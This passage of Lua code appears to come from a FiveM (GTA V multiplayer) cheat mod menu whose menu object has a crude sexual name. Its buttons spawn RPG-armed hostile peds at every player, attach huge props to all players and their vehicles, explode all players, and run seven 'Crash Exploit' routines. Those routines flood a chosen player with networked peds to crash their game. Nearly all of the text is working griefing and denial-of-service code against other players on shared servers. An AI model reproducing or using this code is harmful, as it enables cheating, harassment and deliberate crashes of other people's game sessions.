						CreatePed(21, GetHashKey(bM), hg.x, hg.y + 1, hg.z, 0, true, true)
						CreatePed(21, GetHashKey(bM), hg.x - 1, hg.y, hg.z, 0, true, true)
						CreatePed(21, GetHashKey(bM), hg.x + 1, hg.y, hg.z, 0, true, true)
						CreatePed(21, GetHashKey(bM), hg.x, hg.y - 1, hg.z, 0, true, true)
						CreatePed(21, GetHashKey(bM), hg.x, hg.y + 1, hg.z, 0, true, true)
						NetworkRegisterEntityAsNetworked(ped)
						if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
							local hf = PedToNet(ped)
							NetworkSetNetworkIdDynamic(hf, false)
							SetNetworkIdCanMigrate(hf, true)
							SetNetworkIdExistsOnAllMachines(hf, true)
							GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
							SetPedCanSwitchWeapon(ped, true)
							NetToPed(hf)
							TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
						elseif IsEntityDead(GetPlayerPed(i)) then
							TaskCombatHatedTargetsInArea(ped, hg.x, hg.y, hg.z, 500)
						else
							Citizen.Wait(0)
						end
					end
				end
			elseif IhadSexWithMyStepMother.Button("~s~ﻞﻜﻟﺍ ﻰﻠﻋ ﺮﻘﺑ ﻦﺒﺳﺮﺗ ") then
				local bM = "a_c_cow"
				local bR = "weapon_rpg"
				local ey = GetActivePlayers()
				for i = 0, #ey do
					local hg = GetEntityCoords(GetPlayerPed(i))
					RequestModel(GetHashKey(bM))
					Citizen.Wait(50)
					if HasModelLoaded(GetHashKey(bM)) then
						local ped = CreatePed(21, GetHashKey(bM), hg.x - 1, hg.y, hg.z, 0, true, true)
						CreatePed(21, GetHashKey(bM), hg.x + 1, hg.y, hg.z, 0, true, true)
						CreatePed(21, GetHashKey(bM), hg.x, hg.y - 1, hg.z, 0, true, true)
						CreatePed(21, GetHashKey(bM), hg.x, hg.y + 1, hg.z, 0, true, true)
						CreatePed(21, GetHashKey(bM), hg.x - 1, hg.y, hg.z, 0, true, true)
						CreatePed(21, GetHashKey(bM), hg.x + 1, hg.y, hg.z, 0, true, true)
						CreatePed(21, GetHashKey(bM), hg.x, hg.y - 1, hg.z, 0, true, true)
						CreatePed(21, GetHashKey(bM), hg.x, hg.y + 1, hg.z, 0, true, true)
						CreatePed(21, GetHashKey(bM), hg.x - 1, hg.y, hg.z, 0, true, true)
						CreatePed(21, GetHashKey(bM), hg.x + 1, hg.y, hg.z, 0, true, true)
						CreatePed(21, GetHashKey(bM), hg.x, hg.y - 1, hg.z, 0, true, true)
						CreatePed(21, GetHashKey(bM), hg.x, hg.y + 1, hg.z, 0, true, true)
						NetworkRegisterEntityAsNetworked(ped)
						if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
							local hf = PedToNet(ped)
							NetworkSetNetworkIdDynamic(hf, false)
							SetNetworkIdCanMigrate(hf, true)
							SetNetworkIdExistsOnAllMachines(hf, true)
							GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
							SetPedCanSwitchWeapon(ped, true)
							NetToPed(hf)
							TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
						elseif IsEntityDead(GetPlayerPed(i)) then
							TaskCombatHatedTargetsInArea(ped, hg.x, hg.y, hg.z, 500)
						else
							Citizen.Wait(0)
						end
					end
				end
			elseif IhadSexWithMyStepMother.Button("~s~ﻞﻜﻟﺍ ﻰﻠﻋ ﺕﺎﻨﺑ ﻦﺑﺮﺴﺗ ") then
				local bM = "u_f_y_danceburl_01"
				local bR = "weapon_rpg"
				local ey = GetActivePlayers()
				for i = 0, #ey do
					local hg = GetEntityCoords(GetPlayerPed(i))
					RequestModel(GetHashKey(bM))
					Citizen.Wait(50)
					if HasModelLoaded(GetHashKey(bM)) then
						local ped = CreatePed(21, GetHashKey(bM), hg.x - 1, hg.y, hg.z, 0, true, true)
						CreatePed(21, GetHashKey(bM), hg.x + 1, hg.y, hg.z, 0, true, true)
						CreatePed(21, GetHashKey(bM), hg.x, hg.y - 1, hg.z, 0, true, true)
						CreatePed(21, GetHashKey(bM), hg.x, hg.y + 1, hg.z, 0, true, true)
						CreatePed(21, GetHashKey(bM), hg.x - 1, hg.y, hg.z, 0, true, true)
						CreatePed(21, GetHashKey(bM), hg.x + 1, hg.y, hg.z, 0, true, true)
						CreatePed(21, GetHashKey(bM), hg.x, hg.y - 1, hg.z, 0, true, true)
						CreatePed(21, GetHashKey(bM), hg.x, hg.y + 1, hg.z, 0, true, true)
						CreatePed(21, GetHashKey(bM), hg.x - 1, hg.y, hg.z, 0, true, true)
						CreatePed(21, GetHashKey(bM), hg.x + 1, hg.y, hg.z, 0, true, true)
						CreatePed(21, GetHashKey(bM), hg.x, hg.y - 1, hg.z, 0, true, true)
						CreatePed(21, GetHashKey(bM), hg.x, hg.y + 1, hg.z, 0, true, true)
						NetworkRegisterEntityAsNetworked(ped)
						if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
							local hf = PedToNet(ped)
							NetworkSetNetworkIdDynamic(hf, false)
							SetNetworkIdCanMigrate(hf, true)
							SetNetworkIdExistsOnAllMachines(hf, true)
							GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
							SetPedCanSwitchWeapon(ped, true)
							NetToPed(hf)
							TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
						elseif IsEntityDead(GetPlayerPed(i)) then
							TaskCombatHatedTargetsInArea(ped, hg.x, hg.y, hg.z, 500)
						else
							Citizen.Wait(0)
						end
					end
				end
			elseif IhadSexWithMyStepMother.Button("~s~ﻢﻬﺳ ﻞﻜﻟﺍ ﻰﻠﻋ ﻦﺒﺳﺮﺗ") then
				for i = 0, 128 do
					if IsPedInAnyVehicle(GetPlayerPed(i), true) then
						local hh = "ar_prop_ar_arrow_wide_xl"
						local hi = GetHashKey(hh)
						while not HasModelLoaded(hi) do
							Citizen.Wait(0)
							RequestModel(hi)
						end;
						local hj = CreateObject(hi, 0, 0, 0, true, true, true)
						AttachEntityToEntity(hj, GetVehiclePedIsIn(GetPlayerPed(i), false), GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), "chassis"), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
					else
						local hh = "ar_prop_ar_arrow_wide_xl"
						local hi = GetHashKey(hh)
						while not HasModelLoaded(hi) do
							Citizen.Wait(0)
							RequestModel(hi)
						end;
						local hj = CreateObject(hi, 0, 0, 0, true, true, true)
						AttachEntityToEntity(hj, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
					end
				end
			elseif IhadSexWithMyStepMother.Button("~s~ﻞﻜﻟﺍ ﻰﻠﻋ ﺝﺍﺮﺑﺍ ﻦﺒﺳﺮﺗ ;)") then
				for i = 0, 128 do
					if IsPedInAnyVehicle(GetPlayerPed(i), true) then
						local hh = "ar_prop_ar_cp_tower8x_01a"
						local hi = GetHashKey(hh)
						while not HasModelLoaded(hi) do
							Citizen.Wait(0)
							RequestModel(hi)
						end;
						local hj = CreateObject(hi, 0, 0, 0, true, true, true)
						AttachEntityToEntity(hj, GetVehiclePedIsIn(GetPlayerPed(i), false), GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), "chassis"), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
					else
						local hh = "ar_prop_ar_cp_tower8x_01a"
						local hi = GetHashKey(hh)
						while not HasModelLoaded(hi) do
							Citizen.Wait(0)
							RequestModel(hi)
						end;
						local hj = CreateObject(hi, 0, 0, 0, true, true, true)
						AttachEntityToEntity(hj, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
					end
				end
			elseif IhadSexWithMyStepMother.Button("~s~ﺭﺍﺪﺟ ﻞﻜﻟﺍ ﻲﻠﺨﺗ") then
				local ey = GetActivePlayers()
				for i = 0, #ey do
					if IsPedInAnyVehicle(GetPlayerPed(i), true) then
						local hh = "stt_prop_stunt_track_start"
						local hi = -145066854;
						while not HasModelLoaded(hi) do
							Citizen.Wait(0)
							RequestModel(hi)
						end;
						local hj = CreateObject(hi, 0, 0, 0, true, true, true)
						AttachEntityToEntity(hj, GetVehiclePedIsIn(GetPlayerPed(i), false), GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), "chassis"), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
					else
						local hh = "stt_prop_stunt_track_start"
						local hi = GetHashKey(hh)
						while not HasModelLoaded(hi) do
							Citizen.Wait(0)
							RequestModel(hi)
						end;
						local hj = CreateObject(hi, 0, 0, 0, true, true, true)
						AttachEntityToEntity(hj, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
					end
				end
			elseif IhadSexWithMyStepMother.Button("~s~ﺖﻜﺠﺑﻭﺍ ﻞﻜﻟﺍ ﻰﻠﻋ ﻦﺒﺳﺮﺗ") then
				local ey = GetActivePlayers()
				for i = 0, #ey do
					if IsPedInAnyVehicle(GetPlayerPed(i), true) then
						local hh = "stt_prop_stunt_tube_m"
						local hi = -145066854;
						while not HasModelLoaded(hi) do
							Citizen.Wait(0)
							RequestModel(hi)
						end;
						local hj = CreateObject(hi, 0, 0, 0, true, true, true)
						AttachEntityToEntity(hj, GetVehiclePedIsIn(GetPlayerPed(i), false), GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), "chassis"), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
					else
						local hh = "stt_prop_stunt_tube_m"
						local hi = GetHashKey(hh)
						while not HasModelLoaded(hi) do
							Citizen.Wait(0)
							RequestModel(hi)
						end;
						local hj = CreateObject(hi, 0, 0, 0, true, true, true)
						AttachEntityToEntity(hj, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
					end
				end
			elseif IhadSexWithMyStepMother.Button("~s~ﺔﺷﺎﺷ ﻞﻜﻟﺍ ﻲﻠﺨﺗ") then
				local ey = GetActivePlayers()
				for i = 0, #ey do
					if IsPedInAnyVehicle(GetPlayerPed(i), true) then
						local hh = "prop_big_cin_screen"
						local hi = -145066854;
						while not HasModelLoaded(hi) do
							Citizen.Wait(0)
							RequestModel(hi)
						end;
						local hj = CreateObject(hi, 0, 0, 0, true, true, true)
						AttachEntityToEntity(hj, GetVehiclePedIsIn(GetPlayerPed(i), false), GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), "chassis"), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
					else
						local hh = "prop_big_cin_screen"
						local hi = GetHashKey(hh)
						while not HasModelLoaded(hi) do
							Citizen.Wait(0)
							RequestModel(hi)
						end;
						local hj = CreateObject(hi, 0, 0, 0, true, true, true)
						AttachEntityToEntity(hj, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
					end
				end
			elseif IhadSexWithMyStepMother.Button("Attach Sandy Shores") then
				local ey = GetActivePlayers()
				for i = 0, #ey do
					if IsPedInAnyVehicle(GetPlayerPed(i), true) then
						local hh = "cs4_lod_01_slod3"
						local hi = -145066854;
						while not HasModelLoaded(hi) do
							Citizen.Wait(0)
							RequestModel(hi)
						end;
						local hj = CreateObject(hi, 0, 0, 0, true, true, true)
						AttachEntityToEntity(hj, GetVehiclePedIsIn(GetPlayerPed(i), false), GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), "chassis"), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
					else
						local hh = "cs4_lod_01_slod3"
						local hi = GetHashKey(hh)
						while not HasModelLoaded(hi) do
							Citizen.Wait(0)
							RequestModel(hi)
						end;
						local hj = CreateObject(hi, 0, 0, 0, true, true, true)
						AttachEntityToEntity(hj, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
					end
				end
			elseif IhadSexWithMyStepMother.Button("Explode All Players") then
				ex(gT)
			elseif IhadSexWithMyStepMother.CheckBox("ﻞﻜﻟﺍ ﺮﺠﻔﺗ", ExplodingAll) then
				ExplodingAll = not ExplodingAll
			elseif IhadSexWithMyStepMother.Button("ﺔﺤﻠﺳﺍ ﻞﻜﻟﺍ ﻲﻄﻌﺗ") then
				eX(gT)
			elseif IhadSexWithMyStepMother.Button("ﺔﺤﻠﺳﺍ ﻞﻜﻟﺍ ﻦﻣ ﻞﻴﺸﺗ") then
				eR(gT)
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("crashtroll") then
			if IhadSexWithMyStepMother.Button("Crash Exploit 1") then
				for i = 0, 32 do
					local bs = GetEntityCoords(GetPlayerPed(selectedPlayer))
					RequestModel(GetHashKey("ig_wade"))
					Citizen.Wait(50)
					if HasModelLoaded(GetHashKey("ig_wade")) then
						local ped = CreatePed(21, GetHashKey("ig_wade"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("ig_wade"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("ig_wade"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("ig_wade"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("ig_wade"), bs.x, bs.y, bs.z, 0, true, false)
						if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
							bI(ped)
							GiveWeaponToPed(ped, GetHashKey("WEAPON_RPG"), 9999, 1, 1)
							SetPedCanSwitchWeapon(ped, true)
							bL(ped, selectedPlayer, 0, 0)
							TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
						elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
							TaskCombatHatedTargetsInArea(ped, bs.x, bs.y, bs.z, 500)
						else
							Citizen.Wait(0)
						end
					else
						Citizen.Wait(0)
					end
				end
			elseif IhadSexWithMyStepMother.Button("Crash Exploit 2") then
				for i = 0, 32 do
					local bs = GetEntityCoords(GetPlayerPed(selectedPlayer))
					RequestModel(GetHashKey("mp_m_freemode_01"))
					Citizen.Wait(50)
					if HasModelLoaded(GetHashKey("mp_m_freemode_01")) then
						local ped = CreatePed(21, GetHashKey("mp_m_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("mp_m_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("mp_m_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("mp_m_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("mp_m_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("mp_m_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("mp_m_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("mp_m_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("mp_m_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("mp_m_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("mp_m_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("mp_m_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("mp_m_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("mp_m_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("mp_m_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("mp_m_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("mp_m_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("mp_m_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("mp_m_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("mp_m_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("mp_m_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("mp_m_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("mp_m_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("mp_m_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("mp_m_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
							bI(ped)
							GiveWeaponToPed(ped, GetHashKey("WEAPON_RPG"), 9999, 1, 1)
							SetPedCanSwitchWeapon(ped, true)
							bL(ped, selectedPlayer, 0, 0)
							TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
						elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
							TaskCombatHatedTargetsInArea(ped, bs.x, bs.y, bs.z, 500)
						else
							Citizen.Wait(0)
						end
					else
						Citizen.Wait(0)
					end
				end
			elseif IhadSexWithMyStepMother.Button("Crash Exploit  3") then
				for i = 0, 32 do
					local bs = GetEntityCoords(GetPlayerPed(selectedPlayer))
					RequestModel(GetHashKey("mp_f_freemode_01"))
					Citizen.Wait(50)
					if HasModelLoaded(GetHashKey("mp_f_freemode_01")) then
						local ped = CreatePed(21, GetHashKey("mp_f_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("mp_f_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("mp_f_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("mp_f_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("mp_f_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
							bI(ped)
							GiveWeaponToPed(ped, GetHashKey("WEAPON_PISTOL"), 9999, 1, 1)
							SetPedCanSwitchWeapon(ped, true)
							bL(ped, selectedPlayer, 0, 0)
							TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
						elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
							TaskCombatHatedTargetsInArea(ped, bs.x, bs.y, bs.z, 500)
						else
							Citizen.Wait(0)
						end
					else
						Citizen.Wait(0)
					end
				end
			elseif IhadSexWithMyStepMother.Button("Crash Exploit 4") then
				for i = 0, 32 do
					local bs = GetEntityCoords(GetPlayerPed(selectedPlayer))
					RequestModel(GetHashKey("a_m_m_afriamer_01"))
					Citizen.Wait(50)
					if HasModelLoaded(GetHashKey("a_m_m_afriamer_01")) then
						local ped = CreatePed(21, GetHashKey("a_m_m_afriamer_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("a_m_m_afriamer_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("a_m_m_afriamer_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("a_m_m_afriamer_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("a_m_m_afriamer_01"), bs.x, bs.y, bs.z, 0, true, false)
						if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
							bI(ped)
							GiveWeaponToPed(ped, GetHashKey("WEAPON_ASSAULTRIFLE"), 9999, 1, 1)
							SetPedCanSwitchWeapon(ped, true)
							bL(ped, selectedPlayer, 0, 0)
							TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
						elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
							TaskCombatHatedTargetsInArea(ped, bs.x, bs.y, bs.z, 500)
						else
							Citizen.Wait(0)
						end
					else
						Citizen.Wait(0)
					end
				end
			elseif IhadSexWithMyStepMother.Button("Crash Exploit 5") then
				for i = 0, 32 do
					local bs = GetEntityCoords(GetPlayerPed(selectedPlayer))
					RequestModel(GetHashKey("mp_f_freemode_01"))
					Citizen.Wait(50)
					if HasModelLoaded(GetHashKey("mp_f_freemode_01")) then
						local ped = CreatePed(21, GetHashKey("mp_f_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("mp_f_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("mp_f_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("mp_f_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("mp_f_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
							bI(ped)
							GiveWeaponToPed(ped, GetHashKey("WEAPON_ASSAULTRIFLE"), 9999, 1, 1)
							SetPedCanSwitchWeapon(ped, true)
							bL(ped, selectedPlayer, 0, 0)
							TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
						elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
							TaskCombatHatedTargetsInArea(ped, bs.x, bs.y, bs.z, 500)
						else
							Citizen.Wait(0)
						end
					else
						Citizen.Wait(0)
					end
				end
			elseif IhadSexWithMyStepMother.Button("Crash Exploit 6") then
				for i = 0, 32 do
					local bs = GetEntityCoords(GetPlayerPed(selectedPlayer))
					RequestModel(GetHashKey("mp_f_freemode_01"))
					Citizen.Wait(50)
					if HasModelLoaded(GetHashKey("mp_f_freemode_01")) then
						local ped = CreatePed(21, GetHashKey("mp_f_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("mp_f_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("mp_f_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("mp_f_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("mp_f_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
							bI(ped)
							GiveWeaponToPed(ped, GetHashKey("WEAPON_COMBATPISTOL"), 9999, 1, 1)
							SetPedCanSwitchWeapon(ped, true)
							bL(ped, selectedPlayer, 0, 0)
							TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
						elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
							TaskCombatHatedTargetsInArea(ped, bs.x, bs.y, bs.z, 500)
						else
							Citizen.Wait(0)
						end
					else
						Citizen.Wait(0)
					end
				end
			elseif IhadSexWithMyStepMother.Button("Crash Exploit 7") then
				for i = 0, 32 do
					local bs = GetEntityCoords(GetPlayerPed(selectedPlayer))
					RequestModel(GetHashKey("mp_f_freemode_01"))
					Citizen.Wait(50)
					if HasModelLoaded(GetHashKey("mp_f_freemode_01")) then
						local ped = CreatePed(21, GetHashKey("mp_f_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("mp_f_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("mp_f_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("mp_f_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						CreatePed(21, GetHashKey("mp_f_freemode_01"), bs.x, bs.y, bs.z, 0, true, false)
						if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
							bI(ped)
							GiveWeaponToPed(ped, GetHashKey("WEAPON_PISTOL_MK2"), 9999, 1, 1)
							SetPedCanSwitchWeapon(ped, true)
							bL(ped, selectedPlayer, 0, 0)
							TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
						elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
							TaskCombatHatedTargetsInArea(ped, bs.x, bs.y, bs.z, 500)
						else
							Citizen.Wait(0)
						end
					else
						Citizen.Wait(0)
					end
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("troll") then
			if IhadSexWithMyStepMother.Button("~r~!!Spawn All Objects on him!!") then
				local hk = "cs1_lod2_01_7_slod3"
				local hl = GetHashKey(hk)
				local hm = CreateObject(hl, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hm, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
				local hk = "ar_prop_ar_cp_tower8x_01a"
				local hl = GetHashKey(hk)
				local hm = CreateObject(hl, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hm, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
				local hk = "stt_prop_stunt_track_start"
				local hl = GetHashKey(hk)
				local hm = CreateObject(hl, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hm, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
				local hk = "stt_prop_stunt_tube_m"
				local hl = GetHashKey(hk)
				local hm = CreateObject(hl, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hm, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
				local hk = "ar_prop_ar_arrow_wide_xl"
				local hl = GetHashKey(hk)
				local hm = CreateObject(hl, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hm, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
				local hk = "ar_prop_ar_neon_gate4x_01a"
				local hl = GetHashKey(hk)
				local hm = CreateObject(hl, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hm, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
				local hk = "prop_mp_barrier_02b"
				local hl = GetHashKey(hk)
				local hm = CreateObject(hl, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hm, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
				local hk = "ap1_lod_slod4"
				local hl = GetHashKey(hk)
				local hm = CreateObject(hl, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hm, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
				local hk = "csx_seabed_rock3_"
				local hl = GetHashKey(hk)
				local hm = CreateObject(hl, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hm, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
				local hk = "prop_cj_big_boat"
				local hl = GetHashKey(hk)
				local hm = CreateObject(hl, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hm, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
				local hk = "cs4_lod_01_slod3"
				local hl = GetHashKey(hk)
				local hm = CreateObject(hl, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hm, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
				local hk = "dt1_lod_f1_slod3"
				local hl = GetHashKey(hk)
				local hm = CreateObject(hl, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hm, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
				local hk = "dt1_21_reflproxy"
				local hl = GetHashKey(hk)
				local hm = CreateObject(hl, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hm, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
				local hk = "dt1_props_combo0110_slod"
				local hl = GetHashKey(hk)
				local hm = CreateObject(hl, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hm, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
				local hk = "dt1_11_slod1"
				local hl = GetHashKey(hk)
				local hm = CreateObject(hl, 0, 0, 0, true, true, true)
